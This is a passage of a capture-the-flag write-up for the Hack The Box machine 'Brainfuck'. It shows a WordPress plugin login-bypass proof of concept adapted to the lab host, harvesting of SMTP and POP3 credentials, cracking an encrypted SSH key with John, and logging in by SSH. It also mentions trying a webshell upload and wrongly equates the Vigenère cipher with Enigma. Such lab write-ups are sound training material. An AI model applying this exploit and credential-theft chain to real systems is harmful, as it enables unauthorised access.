+<span class="n">[33m[!</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m No WPVulnDB API Token given, as a result vulnerability data has not been output.</span>
+<span class="n">[33m[!</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Finished: Fri Dec 27 06:01:31 2019</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Requests Done: 3109</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Cached Requests: 11</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Data Sent: 782.499 KB</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Data Received: 849.91 KB</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Memory used: 198.396 MB</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err">[</span><span class="mi">0</span><span class="n">m</span><span class="w"> </span><span class="n">Elapsed</span><span class="w"> </span><span class="nc">time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">01</span><span class="err">:</span><span class="mi">38</span><span class="w"></span>
+</pre></div>
+
+
+<p>There are plenty of useful info in the above output but one thing I learnt while dealing with wordpress is that people do not always update the wordpress plugins. In fact, after skimming through the list carefully and searching on the Internet, it looks like the plugin <strong>WP Support Plus Responsive Ticketing System</strong> is quite outdated (version 7.1.3)</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# searchsploit WordPress Plugin WP Support Plus Responsive</span>
+<span class="err">--------------------------------------------- ----------------------------------------</span>
+<span class="err"> Exploit Title                               |  Path</span>
+<span class="err">                                             | (/usr/share/exploitdb/)</span>
+<span class="err">--------------------------------------------- ----------------------------------------</span>
+<span class="err">WordPress Plugin WP Support Plus Responsive  | exploits/php/webapps/34589.txt</span>
+<span class="err">WordPress Plugin WP Support Plus Responsive  | exploits/php/webapps/40939.txt</span>
+<span class="err">WordPress Plugin WP Support Plus Responsive  | exploits/php/webapps/41006.txt</span>
+<span class="err">--------------------------------------------- ----------------------------------------</span>
+</pre></div>
+
+
+<p>looking on searchsploit for the plugin in question I can see there are three exploits. Also seems like 41006 may be useful as it can let us login.</p>
+<div class="highlight"><pre><span></span>root@Kali:~# cat /usr/share/exploitdb/exploits/php/webapps/41006.txt
+# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
+# Date: 10-01-2017
+# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: web
+
+1. Description
+
+You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
+
+http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+
+2. Proof of Concept
+
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;http://wp/wp-admin/admin-ajax.php&quot;</span><span class="nt">&gt;</span>
+        Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span> <span class="na">value=</span><span class="s">&quot;administrator&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">value=</span><span class="s">&quot;sth&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;action&quot;</span> <span class="na">value=</span><span class="s">&quot;loginGuestFacebook&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+</pre></div>
+
+
+<p>All we have to do in this case is to put the PoC of the above output on a file and save it as html with few modifications:</p>
+<div class="highlight"><pre><span></span><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;https://brainfuck.htb/wp-admin/admin-ajax.php&quot;</span><span class="nt">&gt;</span>
+        Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span> <span class="na">value=</span><span class="s">&quot;administrator&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">value=</span><span class="s">&quot;orestis@brainfuck.htb&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;action&quot;</span> <span class="na">value=</span><span class="s">&quot;loginGuestFacebook&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+</pre></div>
+
+
+<p>So I change the url to https://brainfuck.htb. We found two users with wpscan, "admin" and "administrator" so we can probably leave the latter there. We also add the email I found.</p>
+<p>Then from the same directory where I save that html I run a simple python http server.</p>
+<p><img alt="" src="../images/bf-administrator.png"></p>
+<p>From my browser I enter the url of the location of the exploit and I get the result above, so I click on login. After a bit of loading seemed nothing happened, I got a blank page. However, I opened another tab in the browser and navigated again to https://brainfuck.htb and got this:</p>
+<p><img alt="" src="../images/bf-login.png"></p>
+<p>same page as before but on the upper right site we can see I am now logged in as administrator. In fact, I can navigate to the administrtor personal profile:</p>
+<p><img alt="" src="../images/bf-profile.png"></p>
+<p>I started exploring but I did not find anything useful. I have been particularly looking for a place where I could upload some php code that would potentially give me a shell. So I decided to try the same process with the other user, "admin". With admin I got way more menu options including one to upload media, themes, etc.</p>
+<p>Unfortunately, whether I try to upload a php webshell hidden into a jpg file or I try to edit one of the existing php theme functions there is a major issue, that is these files are not writable probably as an extra security measure.</p>
+<p>In fact, when trying to upload an image I get this error:</p>
+<p><strong><em>Unable to create directory wp-content/uploads/2019/12. Is it parent directory writable by the server?</em></strong></p>
+<p>Instead, in the edit themes session I can see this message:</p>
+<p><strong><em>You need to make this file writable before you can save your changes. See the Codex for more information.</em></strong></p>
+<p>I spent quite some time online looking for a solution but looks like these permissions can only be changed manually from configuration files which we do not have access to (yet). </p>
+<p>In the end I opted for another path. From the nmap scan we saw SMTP, POP3 and IMAP ports are open. I also see that there is a wordpress plugin installed on the website called <strong>Easy WP SMTP</strong>. When I go to the plugin configuration page I see the credentials and other details. The password is obfuscated but we can see it easily by opening the browser inspector as shown in the below screenshot.</p>
+<p><img alt="" src="../images/bf-smtp.png"></p>
+<p>So we have the SMTP credentials: </p>
+<p><code>username --&gt; orestis</code></p>
+<p><code>password --&gt; kHGuERB29DNiNE</code></p>
+<p>Now we can loging to the POP3 server and read the messages:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">telnet</span><span class="w"> </span><span class="mf">10.10.10.17</span><span class="w"> </span><span class="mi">110</span><span class="w"></span>
+<span class="n">Trying</span><span class="w"> </span><span class="mf">10.10.10.17</span><span class="p">...</span><span class="w"></span>
+<span class="n">Connected</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mf">10.10.10.17</span><span class="p">.</span><span class="w"></span>
+<span class="k">Escape</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="s1">&#39;^]&#39;</span><span class="p">.</span><span class="w"></span>
+<span class="o">+</span><span class="n">OK</span><span class="w"> </span><span class="n">Dovecot</span><span class="w"> </span><span class="n">ready</span><span class="p">.</span><span class="w"></span>
+<span class="k">USER</span><span class="w"> </span><span class="n">orestis</span><span class="w"></span>
+<span class="o">+</span><span class="n">OK</span><span class="w"></span>
+<span class="n">PASS</span><span class="w"> </span><span class="n">kHGuERB29DNiNE</span><span class="w"></span>
+<span class="o">+</span><span class="n">OK</span><span class="w"> </span><span class="n">Logged</span><span class="w"> </span><span class="ow">in</span><span class="p">.</span><span class="w"></span>
+<span class="n">LIST</span><span class="w"></span>
+<span class="o">+</span><span class="n">OK</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="nl">messages</span><span class="p">:</span><span class="w"></span>
+<span class="mi">1</span><span class="w"> </span><span class="mi">977</span><span class="w"></span>
+<span class="mi">2</span><span class="w"> </span><span class="mi">514</span><span class="w"></span>
+<span class="p">.</span><span class="w"></span>
+<span class="n">RETR</span><span class="w"> </span><span class="mi">2</span><span class="w"></span>
+<span class="o">+</span><span class="n">OK</span><span class="w"> </span><span class="mi">514</span><span class="w"> </span><span class="n">octets</span><span class="w"></span>
+<span class="k">Return</span><span class="o">-</span><span class="k">Path</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">root</span><span class="nv">@brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="o">&gt;</span><span class="w"></span>
+<span class="n">X</span><span class="o">-</span><span class="n">Original</span><span class="o">-</span><span class="k">To</span><span class="err">:</span><span class="w"> </span><span class="n">orestis</span><span class="w"></span>
+<span class="n">Delivered</span><span class="o">-</span><span class="k">To</span><span class="err">:</span><span class="w"> </span><span class="n">orestis</span><span class="nv">@brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">brainfuck</span><span class="w"> </span><span class="p">(</span><span class="k">Postfix</span><span class="p">,</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">userid</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="n">id</span><span class="w"> </span><span class="mi">4227420</span><span class="n">AEB</span><span class="p">;</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">29</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">2017</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">12</span><span class="err">:</span><span class="mi">06</span><span class="w"> </span><span class="o">+</span><span class="mi">0300</span><span class="w"> </span><span class="p">(</span><span class="n">EEST</span><span class="p">)</span><span class="w"></span>
+<span class="k">To</span><span class="err">:</span><span class="w"> </span><span class="n">orestis</span><span class="nv">@brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="nl">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">Forum</span><span class="w"> </span><span class="n">Access</span><span class="w"> </span><span class="n">Details</span><span class="w"></span>
+<span class="n">Message</span><span class="o">-</span><span class="nl">Id</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="mf">20170429101206.4227420</span><span class="n">AEB</span><span class="nv">@brainfuck</span><span class="o">&gt;</span><span class="w"></span>
+<span class="nc">Date</span><span class="err">:</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">29</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">2017</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">12</span><span class="err">:</span><span class="mi">06</span><span class="w"> </span><span class="o">+</span><span class="mi">0300</span><span class="w"> </span><span class="p">(</span><span class="n">EEST</span><span class="p">)</span><span class="w"></span>
+<span class="k">From</span><span class="err">:</span><span class="w"> </span><span class="n">root</span><span class="nv">@brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"></span>
+
+<span class="n">Hi</span><span class="w"> </span><span class="n">there</span><span class="p">,</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">credentials</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="ss">&quot;secret&quot;</span><span class="w"> </span><span class="n">forum</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">below</span><span class="w"> </span><span class="err">:</span><span class="p">)</span><span class="w"></span>
+
+<span class="nl">username</span><span class="p">:</span><span class="w"> </span><span class="n">orestis</span><span class="w"></span>
+<span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="n">kIEnnfEKJ#9UmdO</span><span class="w"></span>
+
+<span class="n">Regards</span><span class="w"></span>
+</pre></div>
+
+
+<p>There are two emails and only one had useful info. In fact, it contains some credentials I used to successfully login to sup3rs3cr3t.brainfuck.htb. </p>
+<p>In here there are two interesting discussion threads about an ssh key but the most interesting part is encrypted. From the post in clear text I notice orestis always ends his comments with the sentence </p>
+<p><strong><em>Orestis - Hacking for fun and profit</em></strong>.  </p>
+<p>Then in the encrypted post I can see orestis ends the three comments like this:</p>
+<p><strong><em>Pieagnm - Jkoijeg nbw zwx mle grwsnn</em></strong></p>
+<p><strong><em>Wejmvse - Fbtkqal zqb rso rnl cwihsf</em></strong></p>
+<p><strong><em>Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</em></strong></p>
+<p>so we can see there is a similar pattern but the cypher-text is different every time. If you are a bit familiar with cryptography, this seems similar 
+to the <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenere cipher</a> which is an evolution of the Caesar substitution. With Vigenere, a message is encrypted using a shared key and a table that contains the 26 letters of the Latin alphabet. </p>
+<p>This looks to be the same encryption used by the Enigma machine in the WW2. The Enigma was eventually cracked because the Germans placed “Heil Hitler” at the end of every message. Similarly we can use the same strategy but instead we will have the sentence "Orestis - Hacking for fun and profit" at the end of each message which will lead us to crack Enigma.</p>
+<p>That being said, we will use a one time pad decoder first to find the key:</p>
+<p><img alt="" src="../images/pad1.png"></p>
+<p><img alt="" src="../images/pad2.png"></p>
+<p><img alt="" src="../images/pad3.png"></p>
+<p>As we can see from the three screenshots above the common key that is repeated in sequence is <strong>fuckmybrain</strong></p>
+<p>Once we have this info we can use the vigenere decoder to derypt the interesting bit, that is the ssh key:</p>
+<p><img alt="" src="../images/vigerene.png"></p>
+<p>Using the link we decrypted we can now see this ssh key:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Downloads</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">id_rsa</span><span class="w"> </span>
+<span class="c1">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="k">Proc</span><span class="o">-</span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="n">ENCRYPTED</span><span class="w"></span>
+<span class="n">DEK</span><span class="o">-</span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="n">AES</span><span class="o">-</span><span class="mi">128</span><span class="o">-</span><span class="n">CBC</span><span class="p">,</span><span class="mi">6904</span><span class="n">FEF19397786F75BE2D7762AE7382</span><span class="w"></span>
+
+<span class="n">mneag</span><span class="o">/</span><span class="n">YCY8AB</span><span class="o">+</span><span class="n">OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj</span><span class="o">/</span><span class="n">rh</span><span class="o">/</span><span class="w"></span>
+<span class="n">B2nS4</span><span class="o">+</span><span class="mi">9</span><span class="n">CYBK8IR3Vt5Fo7PoWBCjAAwWYlx</span><span class="o">+</span><span class="n">cK0w1DXqa3A</span><span class="o">+</span><span class="n">BLlsSI0Kws9jea6Gi</span><span class="w"></span>
+<span class="n">W1ma</span><span class="o">/</span><span class="n">V7WoJJ</span><span class="o">+</span><span class="n">V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ</span><span class="w"></span>
+<span class="mi">7</span><span class="n">dKcg6AM</span><span class="o">/</span><span class="n">o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ</span><span class="w"></span>
+<span class="n">zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum</span><span class="w"></span>
+<span class="n">oz3XEnhaGmP1jmMoVBWiD</span><span class="o">+</span><span class="mi">2</span><span class="n">RrnL6wnz9kssV</span><span class="o">+</span><span class="n">tgCV0mD97WS</span><span class="o">+</span><span class="mi">1</span><span class="n">ydWEPeCph06Mem</span><span class="w"></span>
+<span class="n">dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF</span><span class="o">+</span><span class="w"></span>
+<span class="n">Fvt6pmMuix8hbipP112Us54yTv</span><span class="o">/</span><span class="n">hyC</span><span class="o">+</span><span class="n">M5g1hWUuj5y4xovgr0LLfI2pGe</span><span class="o">+</span><span class="n">Fv5lXT</span><span class="w"></span>
+<span class="n">mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl</span><span class="o">+</span><span class="n">DlfaAMHWiYUKYs</span><span class="w"></span>
+<span class="n">LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk</span><span class="o">/</span><span class="n">LS</span><span class="o">/</span><span class="n">mLO4e0N3wEX</span><span class="o">+</span><span class="n">NtgVbq</span><span class="w"></span>
+<span class="n">ul9guSlobasIX5DkAcY</span><span class="o">+</span><span class="n">ER3j</span><span class="o">+/</span><span class="n">YefpyEnYs</span><span class="o">+/</span><span class="n">tfTT1oM</span><span class="o">+</span><span class="n">BR3TVSlJcOrvNmrIy59</span><span class="w"></span>
+<span class="n">krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu</span><span class="o">+</span><span class="n">vi9L5nn5LkhO</span><span class="o">/</span><span class="n">V</span><span class="w"></span>
+<span class="n">gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA</span><span class="w"></span>
+<span class="n">VwmM72XbaugmhKW25q</span><span class="o">/</span><span class="mi">46</span><span class="o">/</span><span class="n">yL4VMKuDyHL5Hc</span><span class="o">+</span><span class="n">Ov5v3bQ908p</span><span class="o">+</span><span class="n">Urf04dpvj9SjBzn</span><span class="w"></span>
+<span class="n">schqozogcC1UfJcCm6cl</span><span class="o">+</span><span class="mi">967</span><span class="n">GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt</span><span class="w"></span>
+<span class="n">UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL</span><span class="o">+</span><span class="n">su8f96Kn</span><span class="w"></span>
+<span class="n">F7gwZLtVP87d8R3uAERZnxFO9MuOZU2</span><span class="o">+</span><span class="n">PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy</span><span class="o">+</span><span class="n">M</span><span class="w"></span>
+<span class="n">wZezLNip80XmcVJwGUYsdn</span><span class="o">+</span><span class="n">iB</span><span class="o">/</span><span class="n">UPMddX12J30YUbtw</span><span class="o">/</span><span class="n">R34TQiRFUhWLTFrmOaLab</span><span class="w"></span>
+<span class="n">Iql5L</span><span class="o">+</span><span class="mi">0</span><span class="n">JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg</span><span class="o">/</span><span class="n">HTCy</span><span class="w"></span>
+<span class="n">IQPmHW36mxtc</span><span class="o">+</span><span class="n">IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF</span><span class="w"></span>
+<span class="n">mxy9EVQ</span><span class="o">+</span><span class="n">v49kg4yFwUNPPbsOppKc7gJWpS1Y</span><span class="o">/</span><span class="n">i</span><span class="o">+</span><span class="n">rDKg8ZNV3TIb5TAqIqQRgZqpP</span><span class="w"></span>
+<span class="n">CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF</span><span class="w"></span>
+<span class="mi">9</span><span class="n">DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1</span><span class="o">+</span><span class="n">PU8eIfFzkhUY0qoGS</span><span class="w"></span>
+<span class="n">EBFkZuCPyujYOTyvQZewyd</span><span class="o">+</span><span class="n">ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi</span><span class="w"></span>
+<span class="mi">6</span><span class="n">hD</span><span class="o">+</span><span class="n">jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ</span><span class="w"></span>
+<span class="c1">-----END RSA PRIVATE KEY-----</span>
+</pre></div>
+
+
+<p>Since the key is encrypted we can try to brute force it using <a href="https://tools.kali.org/password-attacks/john">John</a>. Before we can use John to bute force the key we need to convert the ssh key in a format John can work with. To do so we can use a tool called <a href="https://raw.githubusercontent.com/stricture/hashstack-server-plugin-jtr/master/scrapers/sshng2john.py">sshng2john</a>.</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# ./sshng2john.py /home/user/Downloads/id_rsa &gt; id_rsa_john</span>
+<span class="err">root@Kali:~# cat id_rsa_john </span>
+<span class="err">16</span>
+<span class="err">/home/user/Downloads/id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190</span>
+</pre></div>
+
+
+<p>Then I launch John and just after less than 10 minutes it finds the key:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# john id_rsa_john --wordlist=/usr/share/wordlists/rockyou.txt</span>
+<span class="err">Using default input encoding: UTF-8</span>
+<span class="err">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span>
+<span class="err">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span>
+<span class="err">Cost 2 (iteration count) is 1 for all loaded hashes</span>
+<span class="err">Will run 8 OpenMP threads</span>
+<span class="c">Note: This format may emit false positives, so it will keep trying even after</span>
+<span class="err">finding a possible candidate.</span>
+<span class="err">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="err">0g 0:00:03:54 30.05% (ETA: 16:44:35) 0g/s 19124p/s 19124c/s 19124C/s putterfly..puttaro</span>
+<span class="err">0g 0:00:06:45 53.69% (ETA: 16:44:11) 0g/s 19184p/s 19184c/s 19184C/s grumbles5..gruiz_24</span>
+<span class="err">0g 0:00:09:31 76.59% (ETA: 16:44:02) 0g/s 19215p/s 19215c/s 19215C/s KdificilEsCrYo..Kcn2048</span>
+<span class="err">3poulakia!       (/home/user/Downloads/id_rsa)</span>
+<span class="err">Session completed</span>
+</pre></div>
+
+
+<p>So now I can ssh to the box with the ssh key that whose password is <strong>3poulakia!</strong></p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">id_rsa</span> <span class="n">orestis</span><span class="mf">@10.10.10.17</span>
+<span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="err">&#39;</span><span class="mf">10.10.10.17</span> <span class="p">(</span><span class="mf">10.10.10.17</span><span class="p">)</span><span class="err">&#39;</span> <span class="n">can</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">be</span> <span class="n">established</span><span class="p">.</span>
+<span class="n">ECDSA</span> <span class="n">key</span> <span class="n">fingerprint</span> <span class="n">is</span> <span class="nl">SHA256</span><span class="p">:</span><span class="n">S</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">YyJ</span><span class="o">/+</span><span class="n">y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg</span><span class="p">.</span>
+<span class="n">Are</span> <span class="n">you</span> <span class="n">sure</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="k">continue</span> <span class="n">connecting</span> <span class="p">(</span><span class="n">yes</span><span class="o">/</span><span class="n">no</span><span class="o">/</span><span class="p">[</span><span class="n">fingerprint</span><span class="p">])</span><span class="o">?</span> <span class="n">yes</span>
+<span class="nl">Warning</span><span class="p">:</span> <span class="n">Permanently</span> <span class="n">added</span> <span class="err">&#39;</span><span class="mf">10.10.10.17</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="n">list</span> <span class="n">of</span> <span class="n">known</span> <span class="n">hosts</span><span class="p">.</span>
+<span class="n">Enter</span> <span class="n">passphrase</span> <span class="k">for</span> <span class="n">key</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">id_rsa</span><span class="err">&#39;</span><span class="o">:</span> 
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">16.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">4.4.0</span><span class="o">-</span><span class="mi">75</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+ <span class="o">*</span> <span class="nl">Documentation</span><span class="p">:</span>  <span class="nl">https</span><span class="p">:</span><span class="c1">//help.ubuntu.com</span>
+ <span class="o">*</span> <span class="nl">Management</span><span class="p">:</span>     <span class="nl">https</span><span class="p">:</span><span class="c1">//landscape.canonical.com</span>
+ <span class="o">*</span> <span class="nl">Support</span><span class="p">:</span>        <span class="nl">https</span><span class="p">:</span><span class="c1">//ubuntu.com/advantage</span>
+
+<span class="mi">0</span> <span class="n">packages</span> <span class="n">can</span> <span class="n">be</span> <span class="n">updated</span><span class="p">.</span>
+<span class="mi">0</span> <span class="n">updates</span> <span class="n">are</span> <span class="n">security</span> <span class="n">updates</span><span class="p">.</span>
+
+
